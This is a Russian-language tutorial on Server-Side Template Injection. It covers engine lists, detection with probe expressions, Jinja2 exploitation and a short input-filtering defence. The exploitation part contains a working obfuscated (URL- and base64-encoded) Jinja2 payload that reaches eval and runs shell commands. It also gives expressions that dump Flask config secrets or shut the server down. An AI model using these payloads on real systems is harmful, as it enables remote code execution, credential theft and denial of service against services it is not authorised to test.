# SSTI
  
  
  ## Описание
  Есть такой вид атак, как Template Injection (Внедрение шаблона). Данный вид атак делится на два вида: Server Side Template Injection (SSTI) и Client Side Template Injection(CSTI). То есть шаблонизаторы (в вебе) используются для того, чтобы отделить HTML код (представление данных) от кода языка. Шаблон – это файл, содержащий HTML и некоторые маркеры, позволяющий этот шаблон обработать и сформировать на его основе конечный HTML код.
  Уязвимость возникает из-за неверной обработки пользовательских данных.
  
  ## Классификация
  Классифицируются по используемым шаблонизаторам:
#### Java:
Apache Velocity  
FreeMarker  
Histone  
#### PHP:
Возможности самого языка PHP  
BH  
Fenom  
Smarty  
Twig  
TinyButStrong  
XTemplate  
Histone  
Separate  
Blade  
Sigma  
PHPTAL  
Facebook XHP  
dwoo  
Blitz templates  
#### Python:
Genshi  
Kid  
Jinja2  
Mako  
#### Perl:
Template Toolkit  
HTML::Template  
#### Ruby/Rails:
eRuby  
Erubis  
Haml  
Slim  
Liquid  
#### JavaScript:
bem-xjst  
BH  
Handlebars  
Underscore  
pug  
Histone  
  
  ## Условия
  - ОС: любая
  - язык: любой
  - компоненты: шаблонизатор
  - настройки: любые
  
  ## Детектирование
  Обнаружение 2 способами:  
  - Первый способ: пользовательский ввод помещается в шаблонное выражение.  
  - Второй способ: пользовательский ввод может быть помещён внутри шаблонного выражения, как правило, в качестве имени переменной.
  Идентификация:  
  Выяснить, какой шаблонизатор используется. Сделать это очень просто, так как есть готовая схема для этой цели. Этот процесс выглядит так:  
  ![](https://defcon.ru/wp-content/uploads/2016/11/1.png)  
  Нам всего-то нужно подставлять конкретные выражения и следить за ответом сервера. В некоторых случаях одно выражаение может приводить к разным ответам сервера (в зависимости от того, какой шаблонизатор используется). Например, {{7*’7′}} вернёт 49, если используется Twig, 7777777, если используется Jinja2 и не вернёт ничего, если шаблонизатор не используется.
  
  #### 1 шаг
  ![1](https://pp.userapi.com/c846121/v846121517/18bd00/2Po0PiSSPa8.jpg)  
  #### 2 шаг 
  ![2](https://pp.userapi.com/c846121/v846121517/18bd07/pR0f_0JxmBs.jpg)  
  #### 3 шаг
  ![3](https://pp.userapi.com/c846121/v846121517/18bd0e/KZD9VkHvts8.jpg)  
  #### Конечный вывод: 7777777. Мы имеем дело с Jinja2.
  
  
  ## Эксплуатация
  После того, как мы выяснили какой шаблонизатор используется, следующий наш шаг — чтение документации. Вот ключевые области на которые стоит обратить внимание:
  раздел «For Template Authors» описывает базовый синтаксис;
  «Security Considerations» — есть огромный шанс, что разработчики не читали данный раздел;
  список встроеных функций, методов, переменных;
  список дополнений/расширений — некоторый из них могут быть включены по умолчанию.
  В том случае, если в документации не будет говориться о встроенных переменных, то нам придётся их брутить. Нужные словари находятся в Burp Intruder и FuzzDB.
  ### Ручная эксплуатация
  Попробуем вызвать основные шаблоны. 
  
  ![self](https://pp.userapi.com/c846121/v846121517/18bcf9/B2iSScgkCMQ.jpg)  
  Посмотрим конфигурацию сервера:  
  
  ![config](https://pp.userapi.com/c849132/v849132517/112edb/szvDnHpBZw4.jpg)
  Узнаем скрытый в программном коде секрет:   
  
  ![secret](https://pp.userapi.com/c849132/v849132517/112eed/sPWNeku-cVI.jpg)
  #### Исполнение любых команд на сервере (с правами суперпользователя)
  Проверим выполнение последосвательности команд, закодировав их в base64 и urlencode.  
  #### Полностью запрос выглядит так:
  
  ```python
 %7B%7B6795544878%7D%7D%7B%7B%27%27%7D%7D%7B%25+set+d+%3D+%22eval%28__import__%28%27base64%27%29.urlsafe_b64decode%28%27X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYVdRN2JITTdaV05vYnlBaWFXMGdhMjV2WTJ0cFpTd2dhVzBnZDJsdWJtVnlJU0lnUGo0Z2FHRmphMlZrTG5SNGREc2dZMkYwSUdoaFkydGxaQzUwZUhRPScpLmRlY29kZSgpKS5yZWFkKCk%3D%3D%27%29%29%22+%25%7D%7B%25+for+c+in+%5B%5D.__class__.__base__.__subclasses__%28%29+%25%7D+%7B%25+if+c.__name__+%3D%3D+%27catch_warnings%27+%25%7D%0A%7B%25+for+b+in+c.__init__.__globals__.values%28%29+%25%7D+%7B%25+if+b.__class__+%3D%3D+%7B%7D.__class__+%25%7D%0A%7B%25+if+%27eval%27+in+b.keys%28%29+%25%7D%0A%7B%7B+b%5B%27eval%27%5D%28d%29+%7D%7D%0A%7B%25+endif+%25%7D+%7B%25+endif+%25%7D+%7B%25+endfor+%25%7D%0A%7B%25+endif+%25%7D+%7B%25+endfor+%25%7D%7B%7B%27%27%7D%7D%7B%7B3601511735%7D%7D
 ```
 #### urldecode:
```python
{{6795544878}}{{''}}{% set d = "eval(__import__('base64').urlsafe_b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYVdRN2JITTdaV05vYnlBaWFXMGdhMjV2WTJ0cFpTd2dhVzBnZDJsdWJtVnlJU0lnUGo0Z2FHRmphMlZrTG5SNGREc2dZMkYwSUdoaFkydGxaQzUwZUhRPScpLmRlY29kZSgpKS5yZWFkKCk='))" %}{% for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__ == 'catch_warnings' %}
{% for b in c.__init__.__globals__.values() %} {% if b.__class__ == {}.__class__ %}
{% if 'eval' in b.keys() %}
{{ b['eval'](d) }}
{% endif %} {% endif %} {% endfor %}
{% endif %} {% endfor %}{{''}}{{3601511735}}
```
#### base64decode (открытие шелла):
```python
__import__('os').popen(__import__('base64').urlsafe_b64decode('aWQ7bHM7ZWNobyAiaW0ga25vY2tpZSwgaW0gd2lubmVyISIgPj4gaGFja2VkLnR4dDsgY2F0IGhhY2tlZC50eHQ=').decode()).read()
```
#### base64decode (передача последовательности необходимых команд):
```python
id;ls;echo "im knockie, im winner!" >> hacked.txt; cat hacked.txt
```
  Результат запроса:
  ![cmd](https://pp.userapi.com/c849132/v849132517/112efd/tuUyVE4ZbU0.jpg)
  Однако, данные действия возможно автоматизировать, используя консольную утилиту `tplmap`:
  ![tpl](https://pp.userapi.com/c849132/v849132517/112f27/l7Ak41yusFs.jpg)
  С помощью данной утилиты также возможно захватить управление в реальном времени: 
  ![tpl2](https://pp.userapi.com/c849132/v849132517/112f47/7Pm6007VLf8.jpg)
  ### Инструменты
  [Tplmap.](https://github.com/epinna/tplmap)
  
  ## Ущерб
 1) Анализ объекта request, который является глобальным в фрейворке Flask (flask.request). Данный объект содержит ту же самую информацию, что и объект request, доступный через представление. Внутри объекта request находится объект environ. Объект request.environ представляет собой словарь объектов, имеющих отношение к серверной части. Один из элементов этого словаря – метод shutdown_server, который связан с ключом werkzeug.server.shutdown. В шаблон можно инжектировать выражение `{{ request.environ['werkzeug.server.shutdown']() }}` и спровоцировать DOS-атаку. Однако этот метод не доступен, если приложение запущено при помощи HTTP-сервера gunicorn. Так что уязвимость может присутствовать лишь на сервере, который используется в целях разработки.

 2) Анализ объекта config, который, так же как и объект request, является глобальным в фреймворке Flask (`flask.config`). Данный объект представляет собой словарь со всеми переменными, связанными с конфигурацией приложения, в том числе строками для подключения к базе данных, учетными записями к сторонним сервисам, SECRET_KEY и т. д. Просмотр этих переменных осуществляется при помощи выражения `{{ config.items() }}` и не сложнее, чем инжектирование полезной нагрузки. Не спасает и хранение этих данных в переменных среды окружения, поскольку объект config содержит все переменные, связанные с конфигурацией, ПОСЛЕ обработки фреймворком. Помимо того что `config` представляет собой словарь, этот объект также является подклассом, содержащим несколько методов: `from_envvar`, `from_object`, `from_pyfile` и `root_path`.

 3) Возможны:
- XSS (cross-site scripting)
- чтение файлов системы
- достижение RCE (remote code execution)
  
  ## Защита(?)
  ### Основные меры
  Имя может состоять только из букв латинского алфавита. Изменяем исходный код таким образом, чтобы игнорировать ненужные символы.  
  Исходный код:
  ![code](https://pp.userapi.com/c849132/v849132289/1166bd/K_7su5Rg3Kk.jpg)  
  
  Проверка работоспособности:  
  
  ![fil](https://pp.userapi.com/c849132/v849132289/1166a4/T8wirzD24kA.jpg)  
  
  Проверка работоспособности через tplmap:  
  
  ![tplm](https://pp.userapi.com/c849132/v849132289/1166c6/oNOZ7f7LDN8.jpg)  
  
